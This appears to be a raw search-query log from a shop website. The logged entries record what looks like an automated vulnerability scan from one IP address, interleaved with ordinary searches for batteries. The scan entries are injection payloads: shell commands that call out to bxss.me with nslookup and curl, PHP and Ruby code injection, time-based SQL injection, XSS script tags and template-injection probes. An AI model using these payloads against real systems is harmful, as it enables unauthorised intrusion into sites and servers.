gethostbyname(lc('hitpr'.'oqeunwmcc21e3.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(114).chr(70).chr(99).chr(88)	0	2024-04-03 01-36-16	94.190.105.14
mr.	0	2024-04-03 01-36-16	94.190.105.14
';print(md5(31337));$a='	0	2024-04-03 01-36-16	94.190.105.14
батарейки	37	2024-04-03 01-36-16	94.190.105.14
mr.	0	2024-04-03 01-36-29	94.190.105.14
";print(md5(31337));$a="	0	2024-04-03 01-36-29	94.190.105.14
батарейки	37	2024-04-03 01-36-29	94.190.105.14
mr.	0	2024-04-03 01-36-55	94.190.105.14
${@print(md5(31337))}	0	2024-04-03 01-36-55	94.190.105.14
батарейки	37	2024-04-03 01-36-55	94.190.105.14
mr.	0	2024-04-03 01-36-55	94.190.105.14
${@print(md5(31337))}\	0	2024-04-03 01-37-00	94.190.105.14
батарейки	37	2024-04-03 01-37-00	94.190.105.14
mr.	0	2024-04-03 01-37-01	94.190.105.14
батарейки	37	2024-04-03 01-37-11	94.190.105.14
mr.	0	2024-04-03 01-37-11	94.190.105.14
'.print(md5(31337)).'	0	2024-04-03 01-37-11	94.190.105.14
mr.	0	2024-04-03 01-37-12	94.190.105.14
батарейки	37	2024-04-03 01-37-13	94.190.105.14
mr.	0	2024-04-03 01-37-13	94.190.105.14
батарейки	37	2024-04-03 01-37-14	94.190.105.14
mr.	0	2024-04-03 01-37-14	94.190.105.14
батарейки	37	2024-04-03 01-37-16	94.190.105.14
mr.	0	2024-04-03 01-37-17	94.190.105.14
батарейки	37	2024-04-03 01-37-17	94.190.105.14
mr.	0	2024-04-03 01-37-18	94.190.105.14
ичыыюьу/е/чыыюреьд?%00	0	2024-04-03 01-37-18	94.190.105.14
батарейки	37	2024-04-03 01-37-18	94.190.105.14
mr.	0	2024-04-03 01-37-18	94.190.105.14
"+"a".concat(70-3).concat(22*4).concat(118).concat(67).concat(115).concat(85)+(require"socket"
socket.gethostbyname("hitrh"+"ijxtzgnyecf18.bxss.me.")[3].to_s)+"	0	2024-04-03 01-37-19	94.190.105.14
mr.	0	2024-04-03 01-37-19	94.190.105.14
батарейки	37	2024-04-03 01-37-19	94.190.105.14
mr.	0	2024-04-03 01-37-19	94.190.105.14
'+'a'.concat(70-3).concat(22*4).concat(112).concat(85).concat(122).concat(69)+(require'socket'
socket.gethostbyname('hitfm'+'eyftasev8cabe.bxss.me.')[3].to_s)+'	0	2024-04-03 01-37-20	94.190.105.14
батарейки	37	2024-04-03 01-37-20	94.190.105.14
mr.	0	2024-04-03 01-37-20	94.190.105.14
'a'.concat(70-3).concat(22*4).concat(105).concat(73).concat(115).concat(77)+(require'socket'
socket.gethostbyname('hitlc'+'ovojkpbn48ff5.bxss.me.')[3].to_s)	0	2024-04-03 01-37-20	94.190.105.14
батарейки	37	2024-04-03 01-37-20	94.190.105.14
mr.	0	2024-04-03 01-37-21	94.190.105.14
батарейки	37	2024-04-03 01-37-22	94.190.105.14
mr.	0	2024-04-03 01-37-23	94.190.105.14
index.php	0	2024-04-03 01-37-23	94.190.105.14
батарейки	37	2024-04-03 01-37-23	94.190.105.14
mr.	0	2024-04-03 01-37-23	94.190.105.14
батарейки	37	2024-04-03 01-37-24	94.190.105.14
mr.	0	2024-04-03 01-37-24	94.190.105.14
батарейки	37	2024-04-03 01-37-24	94.190.105.14
index.php	0	2024-04-03 01-37-25	94.190.105.14
mr.	0	2024-04-03 01-37-25	94.190.105.14
батарейки	37	2024-04-03 01-37-26	94.190.105.14
index.php/.	0	2024-04-03 01-37-26	94.190.105.14
батарейки	37	2024-04-03 01-37-26	94.190.105.14
mr.	0	2024-04-03 01-37-26	94.190.105.14
батарейки	37	2024-04-03 01-37-27	94.190.105.14
mr.	0	2024-04-03 01-37-27	94.190.105.14
батарейки	37	2024-04-03 01-37-28	94.190.105.14
xfs.bxss.me	0	2024-04-03 01-37-28	94.190.105.14
mr.	0	2024-04-03 01-37-28	94.190.105.14
батарейки	37	2024-04-03 01-37-28	94.190.105.14
mr.	0	2024-04-03 01-37-28	94.190.105.14
986611	0	2024-04-03 01-37-29	94.190.105.14
батарейки	37	2024-04-03 01-37-29	94.190.105.14
mr.	0	2024-04-03 01-37-29	94.190.105.14
батарейки	37	2024-04-03 01-37-29	94.190.105.14
http://xfs.bxss.me?yugkabel.ru	0	2024-04-03 01-37-30	94.190.105.14
mr.	0	2024-04-03 01-37-30	94.190.105.14
батарейки	37	2024-04-03 01-37-30	94.190.105.14
xfs.bxss.me?yugkabel.ru	0	2024-04-03 01-37-30	94.190.105.14
mr.	0	2024-04-03 01-37-30	94.190.105.14
<!--	0	2024-04-03 01-37-30	94.190.105.14
mr.'"()&%<zzz><script >2cpg(9784)</script>	0	2024-04-03 01-37-31	94.190.105.14
батарейки	37	2024-04-03 01-37-31	94.190.105.14
mr.	0	2024-04-03 01-37-31	94.190.105.14
'"()&%<zzz><script >2cpg(9426)</script>	0	2024-04-03 01-37-31	94.190.105.14
батарейки	37	2024-04-03 01-37-32	94.190.105.14
mr.	0	2024-04-03 01-37-32	94.190.105.14
/\xfs.bxss.me?yugkabel.ru	0	2024-04-03 01-37-32	94.190.105.14
батарейки	37	2024-04-03 01-37-32	94.190.105.14
mr.	0	2024-04-03 01-37-32	94.190.105.14
батарейки	37	2024-04-03 01-37-32	94.190.105.14
mr.	0	2024-04-03 01-37-32	94.190.105.14
mr.9128343	0	2024-04-03 01-37-33	94.190.105.14
mr.	0	2024-04-03 01-37-33	94.190.105.14
батарейки	37	2024-04-03 01-37-35	94.190.105.14
mr.	0	2024-04-03 01-37-35	94.190.105.14
mr.9128343<	0	2024-04-03 01-37-36	94.190.105.14
mr.	0	2024-04-03 01-37-36	94.190.105.14
батарейки	37	2024-04-03 01-37-36	94.190.105.14
mr.	0	2024-04-03 01-37-36	94.190.105.14
иап5507?ы1?ы2?ы3?род5507	0	2024-04-03 01-37-37	94.190.105.14
батарейки	37	2024-04-03 01-37-37	94.190.105.14
undefined	0	2024-04-03 01-37-38	94.190.105.14
mr.	0	2024-04-03 01-37-38	94.190.105.14
иапч7014??я1??я2ф?исчрод7014	0	2024-04-03 01-37-39	94.190.105.14
1bskss9eo	0	2024-04-03 01-37-39	94.190.105.14
mr.	0	2024-04-03 01-37-39	94.190.105.14
батарейки	37	2024-04-03 01-37-39	94.190.105.14
mr.	0	2024-04-03 01-37-41	94.190.105.14
б%=хх=х@х#х$хваиъъ%ю	0	2024-04-03 01-37-41	94.190.105.14
батарейки	37	2024-04-03 01-37-41	94.190.105.14
mr.	0	2024-04-03 01-37-41	94.190.105.14
батарейки	37	2024-04-03 01-37-41	94.190.105.14
mr.	0	2024-04-03 01-37-43	94.190.105.14
dfb{{98991*97996}}xca	0	2024-04-03 01-37-44	94.190.105.14
батарейки	37	2024-04-03 01-37-44	94.190.105.14
undefined	0	2024-04-03 01-37-45	94.190.105.14
батарейки	37	2024-04-03 01-37-45	94.190.105.14
mr.	0	2024-04-03 01-37-45	94.190.105.14
батарейки	37	2024-04-03 01-37-45	94.190.105.14
dfb{{98991*97996}}xca	0	2024-04-03 01-37-45	94.190.105.14
mr.	0	2024-04-03 01-37-46	94.190.105.14
батарейки	37	2024-04-03 01-37-46	94.190.105.14
ваих98991*97996ъчсф	0	2024-04-03 01-37-48	94.190.105.14
батарейки	37	2024-04-03 01-37-48	94.190.105.14
mr.	0	2024-04-03 01-37-48	94.190.105.14
батарейки	37	2024-04-03 01-37-48	94.190.105.14
ваи$х98991*97996ъчсф	0	2024-04-03 01-38-07	94.190.105.14
батарейки	37	2024-04-03 01-38-07	94.190.105.14
mr.	0	2024-04-03 01-38-10	94.190.105.14
батарейки	37	2024-04-03 01-38-10	94.190.105.14
ваи#х98991*97996ъчсф	0	2024-04-03 01-38-10	94.190.105.14
батарейки	37	2024-04-03 01-38-10	94.190.105.14
mr.	0	2024-04-03 01-38-11	94.190.105.14
ваих#98991*97996ъчсф	0	2024-04-03 01-38-11	94.190.105.14
батарейки	37	2024-04-03 01-38-11	94.190.105.14
ваих@98991*97996ъчсф	0	2024-04-03 01-38-12	94.190.105.14
батарейки	37	2024-04-03 01-38-12	94.190.105.14
*:*&fl=*,id:[value%20v='\u0036\u0036\u003696235441\u0039\u0039\u0039'],name:[value%20v='\u0036\u0036\u003696235441\u0039\u0039\u0039'],content:[value%20v='\u0036\u0036\u003696235441\u0039\u0039\u0039'],body:[value%20v='\u0036\u0036\u003696235441\u0039\u0039\u0039'],title:[value%20v='\u0036\u0036\u003696235441\u0039\u0039\u0039']&rows=1#	0	2024-04-03 01-38-14	94.190.105.14
dfb{{=98991*97996}}xca	0	2024-04-03 01-38-14	94.190.105.14
mr.	0	2024-04-03 01-38-14	94.190.105.14
батарейки	37	2024-04-03 01-38-14	94.190.105.14
ваи@(98991*97996)чсф	0	2024-04-03 01-38-15	94.190.105.14
батарейки	37	2024-04-03 01-38-15	94.190.105.14
dfb<%=98991*97996%>xca	0	2024-04-03 01-38-16	94.190.105.14
response.write(9484522*9379238)	0	2024-04-03 01-38-20	94.190.105.14
батарейки	37	2024-04-03 01-38-20	94.190.105.14
mr.	0	2024-04-03 01-38-20	94.190.105.14
dfb#set($x=98991*97996)${x}xca	0	2024-04-03 01-38-20	94.190.105.14
батарейки	37	2024-04-03 01-38-20	94.190.105.14
dfb{{"abc"|title}}xca	0	2024-04-03 01-38-21	94.190.105.14
'+response.write(9484522*9379238)+'	0	2024-04-03 01-38-21	94.190.105.14
батарейки	37	2024-04-03 01-38-21	94.190.105.14
print("dfb" . 98991*97996 . "xca");	0	2024-04-03 01-38-22	94.190.105.14
батарейки	37	2024-04-03 01-38-22	94.190.105.14
"+response.write(9484522*9379238)+"	0	2024-04-03 01-38-23	94.190.105.14
батарейки	37	2024-04-03 01-38-25	94.190.105.14
98991*97996*98991*97996	0	2024-04-03 01-38-26	94.190.105.14
батарейки	37	2024-04-03 01-38-26	94.190.105.14
mr.	0	2024-04-03 01-38-26	94.190.105.14
батарейки	37	2024-04-03 01-38-26	94.190.105.14
dfb{@math key=98991 method="multiply" operand=97996/}xca	0	2024-04-03 01-38-27	94.190.105.14
батарейки	37	2024-04-03 01-38-27	94.190.105.14
dfb{{{this}}}xca	0	2024-04-03 01-38-27	94.190.105.14
батарейки	37	2024-04-03 01-38-28	94.190.105.14
#{98991*97996*98991*97996}	0	2024-04-03 01-38-29	94.190.105.14
mr.	0	2024-04-03 01-38-29	94.190.105.14
батарейки	37	2024-04-03 01-38-29	94.190.105.14
dfb#{xca}=123	0	2024-04-03 01-38-29	94.190.105.14
батарейки	37	2024-04-03 01-38-30	94.190.105.14
dfb{{'abcd'.touppercase()}}xca	0	2024-04-03 01-38-32	94.190.105.14
батарейки	37	2024-04-03 01-38-32	94.190.105.14
aaabbbccc{{define "bla"}}bla{{end}}{{define "dfb"}}xyz{{end}}{{template "dfb"}}cccbbbaaa	0	2024-04-03 01-38-33	94.190.105.14
батарейки	37	2024-04-03 01-38-34	94.190.105.14
mr.	0	2024-04-03 01-38-34	94.190.105.14
батарейки	37	2024-04-03 01-38-36	94.190.105.14
dfb{{98991*97996}}xca	0	2024-04-03 01-38-36	94.190.105.14
батарейки	37	2024-04-03 01-38-36	94.190.105.14
dfb[[${98991*97996}]]xca	0	2024-04-03 01-38-38	94.190.105.14
батарейки	37	2024-04-03 01-38-38	94.190.105.14
mr.	0	2024-04-03 01-38-40	94.190.105.14
батарейки	37	2024-04-03 01-38-40	94.190.105.14
dfb__${98991*97996}__::.x	0	2024-04-03 01-38-41	94.190.105.14
батарейки	37	2024-04-03 01-38-41	94.190.105.14
"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")	0	2024-04-03 01-38-41	94.190.105.14
echo vgtqqw$()\ caxtsx\nz^xyu||a #' &echo vgtqqw$()\ caxtsx\nz^xyu||a #|" &echo vgtqqw$()\ caxtsx\nz^xyu||a #	0	2024-04-03 01-38-42	94.190.105.14
батарейки	37	2024-04-03 01-38-42	94.190.105.14
&echo jysuca$()\ kyihmx\nz^xyu||a #' &echo jysuca$()\ kyihmx\nz^xyu||a #|" &echo jysuca$()\ kyihmx\nz^xyu||a #	0	2024-04-03 01-38-42	94.190.105.14
mr.	0	2024-04-03 01-38-42	94.190.105.14
иап3190?ы1?ы2?ы3?род3190	0	2024-04-03 01-38-42	94.190.105.14
батарейки	37	2024-04-03 01-38-43	94.190.105.14
батарейки&echo jhekog$()\ czmaej\nz^xyu||a #' &echo jhekog$()\ czmaej\nz^xyu||a #|" &echo jhekog$()\ czmaej\nz^xyu||a #	0	2024-04-03 01-38-44	94.190.105.14
батарейки	37	2024-04-03 01-38-44	94.190.105.14
иапч1860??я1??я2ф?исчрод1860	0	2024-04-03 01-38-44	94.190.105.14
батарейки	37	2024-04-03 01-38-44	94.190.105.14
mr.	0	2024-04-03 01-38-46	94.190.105.14
|echo wnneby$()\ vjisrq\nz^xyu||a #' |echo wnneby$()\ vjisrq\nz^xyu||a #|" |echo wnneby$()\ vjisrq\nz^xyu||a #	500	2024-04-03 01-38-46	94.190.105.14
б%=хх=х@х#х$хваиъъ%ю	0	2024-04-03 01-38-46	94.190.105.14
батарейки	37	2024-04-03 01-38-46	94.190.105.14
mr.	0	2024-04-03 01-38-46	94.190.105.14
батарейки|echo lkznvg$()\ eairmp\nz^xyu||a #' |echo lkznvg$()\ eairmp\nz^xyu||a #|" |echo lkznvg$()\ eairmp\nz^xyu||a #	37	2024-04-03 01-38-49	94.190.105.14
mr.	0	2024-04-03 01-38-50	94.190.105.14
батарейки	37	2024-04-03 01-38-50	94.190.105.14
mr.	0	2024-04-03 01-38-50	94.190.105.14
батарейки	37	2024-04-03 01-38-50	94.190.105.14
dfb{{98991*97996}}xca	0	2024-04-03 01-38-52	94.190.105.14
батарейки	37	2024-04-03 01-38-52	94.190.105.14
mr.	0	2024-04-03 01-38-52	94.190.105.14
батарейки	37	2024-04-03 01-38-52	94.190.105.14
$(nslookup -q=cname hitjgnjxamrgd6087a.bxss.me||curl hitjgnjxamrgd6087a.bxss.me)	0	2024-04-03 01-38-52	94.190.105.14
dfb{{98991*97996}}xca	0	2024-04-03 01-38-55	94.190.105.14
батарейки	37	2024-04-03 01-38-55	94.190.105.14
&nslookup -q=cname hitigqlobuswr8fd4d.bxss.me&'\"`0&nslookup -q=cname hitigqlobuswr8fd4d.bxss.me&`'	0	2024-04-03 01-38-55	94.190.105.14
zc15etdy	0	2024-04-03 01-38-57	94.190.105.14
батарейки	37	2024-04-03 01-38-57	94.190.105.14
ваих98991*97996ъчсф	0	2024-04-03 01-38-57	94.190.105.14
&(nslookup -q=cname hitbjbcvsckvubd7f0.bxss.me||curl hitbjbcvsckvubd7f0.bxss.me)&'\"`0&(nslookup -q=cname hitbjbcvsckvubd7f0.bxss.me||curl hitbjbcvsckvubd7f0.bxss.me)&`'	0	2024-04-03 01-38-57	94.190.105.14
батарейки	37	2024-04-03 01-38-57	94.190.105.14
ваи$х98991*97996ъчсф	0	2024-04-03 01-38-58	94.190.105.14
батарейки	37	2024-04-03 01-38-58	94.190.105.14
|(nslookup -q=cname hitonhqmhzxiu32001.bxss.me||curl hitonhqmhzxiu32001.bxss.me)	0	2024-04-03 01-38-59	94.190.105.14
батарейки	37	2024-04-03 01-38-59	94.190.105.14
ваи#х98991*97996ъчсф	0	2024-04-03 01-38-59	94.190.105.14
батарейки	37	2024-04-03 01-39-00	94.190.105.14
`(nslookup -q=cname hiterzfnmezuw306ca.bxss.me||curl hiterzfnmezuw306ca.bxss.me)`	0	2024-04-03 01-39-00	94.190.105.14
батарейки	37	2024-04-03 01-39-00	94.190.105.14
ваих#98991*97996ъчсф	0	2024-04-03 01-39-01	94.190.105.14
;(nslookup -q=cname hitraktenhvow42af6.bxss.me||curl hitraktenhvow42af6.bxss.me)|(nslookup -q=cname hitraktenhvow42af6.bxss.me||curl hitraktenhvow42af6.bxss.me)&(nslookup -q=cname hitraktenhvow42af6.bxss.me||curl hitraktenhvow42af6.bxss.me)	0	2024-04-03 01-39-01	94.190.105.14
батарейки	37	2024-04-03 01-39-01	94.190.105.14
ваих@98991*97996ъчсф	0	2024-04-03 01-39-01	94.190.105.14
батарейки	37	2024-04-03 01-39-01	94.190.105.14
|(nslookup${ifs}-q${ifs}cname${ifs}hitgedmugjkvj295b8.bxss.me||curl${ifs}hitgedmugjkvj295b8.bxss.me)	0	2024-04-03 01-39-02	94.190.105.14
батарейки	37	2024-04-03 01-39-02	94.190.105.14
dfb{{=98991*97996}}xca	0	2024-04-03 01-39-02	94.190.105.14
батарейки	37	2024-04-03 01-39-02	94.190.105.14
&(nslookup${ifs}-q${ifs}cname${ifs}hitrrzxaldgxr82805.bxss.me||curl${ifs}hitrrzxaldgxr82805.bxss.me)&'\"`0&(nslookup${ifs}-q${ifs}cname${ifs}hitrrzxaldgxr82805.bxss.me||curl${ifs}hitrrzxaldgxr82805.bxss.me)&`'	0	2024-04-03 01-39-03	94.190.105.14
батарейки	37	2024-04-03 01-39-03	94.190.105.14
ваи@(98991*97996)чсф	0	2024-04-03 01-39-03	94.190.105.14
батарейки	37	2024-04-03 01-39-03	94.190.105.14
dfb<%=98991*97996%>xca	0	2024-04-03 01-39-08	94.190.105.14
батарейки	37	2024-04-03 01-39-08	94.190.105.14
батарейкиsnfsqud2	0	2024-04-03 01-39-08	94.190.105.14
батарейки	37	2024-04-03 01-39-08	94.190.105.14
dfb#set($x=98991*97996)${x}xca	0	2024-04-03 01-39-09	94.190.105.14
батарейки	37	2024-04-03 01-39-09	94.190.105.14
dfb{{"abc"|title}}xca	0	2024-04-03 01-39-14	94.190.105.14
батарейки' and 2*3*8=6*8 and 'hwm3'='hwm3	0	2024-04-03 01-39-14	94.190.105.14
батарейки	37	2024-04-03 01-39-14	94.190.105.14
батарейки" and 2*3*8=6*8 and "jres"="jres	0	2024-04-03 01-39-15	94.190.105.14
print("dfb" . 98991*97996 . "xca");	0	2024-04-03 01-39-15	94.190.105.14
батарейки	37	2024-04-03 01-39-15	94.190.105.14
батарейки%' and 2*3*8=6*8 and 'jcga'!='jcga%	0	2024-04-03 01-39-16	94.190.105.14
98991*97996*98991*97996	0	2024-04-03 01-39-16	94.190.105.14
батарейки	37	2024-04-03 01-39-16	94.190.105.14
-1 or 2+549-549-1=0+0+0+1	500	2024-04-03 01-39-17	94.190.105.14
батарейки	37	2024-04-03 01-39-17	94.190.105.14
dfb{@math key=98991 method="multiply" operand=97996/}xca	0	2024-04-03 01-39-18	94.190.105.14
батарейки	37	2024-04-03 01-39-18	94.190.105.14
-1 or 3+549-549-1=0+0+0+1	500	2024-04-03 01-39-18	94.190.105.14
батарейки	37	2024-04-03 01-39-19	94.190.105.14
dfb{{{this}}}xca	0	2024-04-03 01-39-19	94.190.105.14
батарейки	37	2024-04-03 01-39-19	94.190.105.14
#{98991*97996*98991*97996}	0	2024-04-03 01-39-20	94.190.105.14
батарейки	37	2024-04-03 01-39-20	94.190.105.14
-1 or 3*2<(0+5+549-549)	500	2024-04-03 01-39-20	94.190.105.14
батарейки	37	2024-04-03 01-39-20	94.190.105.14
dfb#{xca}=123	0	2024-04-03 01-39-21	94.190.105.14
батарейки	37	2024-04-03 01-39-21	94.190.105.14
-1 or 3*2>(0+5+549-549)	500	2024-04-03 01-39-22	94.190.105.14
батарейки	37	2024-04-03 01-39-22	94.190.105.14
dfb{{'abcd'.touppercase()}}xca	0	2024-04-03 01-39-22	94.190.105.14
батарейки	37	2024-04-03 01-39-22	94.190.105.14
батарейки'||'	0	2024-04-03 01-39-22	94.190.105.14
батарейки	37	2024-04-03 01-39-22	94.190.105.14
aaabbbccc{{define "bla"}}bla{{end}}{{define "dfb"}}xyz{{end}}{{template "dfb"}}cccbbbaaa	0	2024-04-03 01-39-23	94.190.105.14
dfb{{98991*97996}}xca	0	2024-04-03 01-39-23	94.190.105.14
батарейки	37	2024-04-03 01-39-23	94.190.105.14
if(now()=sysdate(),sleep(15),0)	0	2024-04-03 01-39-23	94.190.105.14
батарейки	37	2024-04-03 01-39-23	94.190.105.14
dfb[[${98991*97996}]]xca	0	2024-04-03 01-39-24	94.190.105.14
батарейки	37	2024-04-03 01-39-24	94.190.105.14
{{22815*22815}}	0	2024-04-03 01-39-24	94.190.105.14
батарейки	37	2024-04-03 01-39-24	94.190.105.14
dfb__${98991*97996}__::.x	0	2024-04-03 01-39-25	94.190.105.14
батарейки	37	2024-04-03 01-39-25	94.190.105.14
батарейки0'xor(if(now()=sysdate(),sleep(15),0))xor'z	0	2024-04-03 01-39-25	94.190.105.14
батарейки	37	2024-04-03 01-39-25	94.190.105.14
"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")	0	2024-04-03 01-39-25	94.190.105.14
батарейки	37	2024-04-03 01-39-26	94.190.105.14
иап10293?ы1?ы2?ы3?род10293	0	2024-04-03 01-39-26	94.190.105.14
батарейки	37	2024-04-03 01-39-26	94.190.105.14
батарейки<esi:include src="http://bxss.me/rpb.png"/>	0	2024-04-03 01-39-27	94.190.105.14
батарейки	37	2024-04-03 01-39-27	94.190.105.14
батарейки0"xor(if(now()=sysdate(),sleep(15),0))xor"z	0	2024-04-03 01-39-28	94.190.105.14
батарейки	37	2024-04-03 01-39-28	94.190.105.14
иапч9383??я1??я2ф?исчрод9383	0	2024-04-03 01-39-28	94.190.105.14
батарейки	37	2024-04-03 01-39-28	94.190.105.14
${9999207+9999309}	0	2024-04-03 01-39-28	94.190.105.14
батарейки	37	2024-04-03 01-39-28	94.190.105.14
{{22815*22815}}	0	2024-04-03 01-39-29	94.190.105.14
б%=хх=х@х#х$хваиъъ%ю	0	2024-04-03 01-39-29	94.190.105.14
батарейки	37	2024-04-03 01-39-29	94.190.105.14
mr.	0	2024-04-03 01-39-32	94.190.105.14
(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/	0	2024-04-03 01-39-33	94.190.105.14
батарейки	37	2024-04-03 01-39-33	94.190.105.14
dfb{{98991*97996}}xca	0	2024-04-03 01-39-34	94.190.105.14
батарейки	37	2024-04-03 01-39-34	94.190.105.14
dfb{{98991*97996}}xca	0	2024-04-03 01-39-35	94.190.105.14
батарейки-1 waitfor delay '0:0:15' --	0	2024-04-03 01-39-35	94.190.105.14
батарейки	37	2024-04-03 01-39-35	94.190.105.14
ваих98991*97996ъчсф	0	2024-04-03 01-39-36	94.190.105.14
батарейки	37	2024-04-03 01-39-36	94.190.105.14
ваи$х98991*97996ъчсф	0	2024-04-03 01-39-38	94.190.105.14
батарейкиjbafy6bd'; waitfor delay '0:0:15' --	0	2024-04-03 01-39-38	94.190.105.14
батарейки	37	2024-04-03 01-39-38	94.190.105.14
ваи#х98991*97996ъчсф	0	2024-04-03 01-39-40	94.190.105.14
батарейки	37	2024-04-03 01-39-40	94.190.105.14
батарейкиm5vmewtt' or 879=(select 879 from pg_sleep(15))--	0	2024-04-03 01-39-41	94.190.105.14
ваих#98991*97996ъчсф	0	2024-04-03 01-39-41	94.190.105.14
батарейки	37	2024-04-03 01-39-41	94.190.105.14
ваих@98991*97996ъчсф	0	2024-04-03 01-39-42	94.190.105.14
батарейки	37	2024-04-03 01-39-43	94.190.105.14
dfb{{=98991*97996}}xca	0	2024-04-03 01-39-44	94.190.105.14
батарейки	37	2024-04-03 01-39-44	94.190.105.14
батарейки'||dbms_pipe.receive_message(chr(98)||chr(98)||chr(98),15)||'	0	2024-04-03 01-39-45	94.190.105.14
ваи@(98991*97996)чсф	0	2024-04-03 01-39-45	94.190.105.14
батарейки	37	2024-04-03 01-39-46	94.190.105.14
dfb<%=98991*97996%>xca	0	2024-04-03 01-39-47	94.190.105.14
батарейки	37	2024-04-03 01-39-47	94.190.105.14
батарейки'"	37	2024-04-03 01-39-47	94.190.105.14
батарейки	37	2024-04-03 01-39-47	94.190.105.14
dfb#set($x=98991*97996)${x}xca	0	2024-04-03 01-39-48	94.190.105.14
батарейки	37	2024-04-03 01-39-48	94.190.105.14
батарейки????%2527%2522\'\"	0	2024-04-03 01-39-49	94.190.105.14
батарейки	37	2024-04-03 01-39-50	94.190.105.14
dfb{{"abc"|title}}xca	0	2024-04-03 01-39-50	94.190.105.14
батарейки	37	2024-04-03 01-39-50	94.190.105.14
print("dfb" . 98991*97996 . "xca");	0	2024-04-03 01-39-52	94.190.105.14
@@yzkz6	0	2024-04-03 01-39-52	94.190.105.14
батарейки	37	2024-04-03 01-39-52	94.190.105.14
98991*97996*98991*97996	0	2024-04-03 01-39-53	94.190.105.14
батарейки	37	2024-04-03 01-39-53	94.190.105.14
dfb{@math key=98991 method="multiply" operand=97996/}xca	0	2024-04-03 01-39-54	94.190.105.14
батарейки	37	2024-04-03 01-39-54	94.190.105.14
dfb{{{this}}}xca	0	2024-04-03 01-39-56	94.190.105.14
батарейки	37	2024-04-03 01-39-57	94.190.105.14
#{98991*97996*98991*97996}	0	2024-04-03 01-39-57	94.190.105.14
батарейки	37	2024-04-03 01-39-57	94.190.105.14
dfb#{xca}=123	0	2024-04-03 01-39-59	94.190.105.14
батарейки&n950842=v986524	0	2024-04-03 01-40-00	94.190.105.14
батарейки	37	2024-04-03 01-40-00	94.190.105.14
dfb{{'abcd'.touppercase()}}xca	0	2024-04-03 01-40-01	94.190.105.14
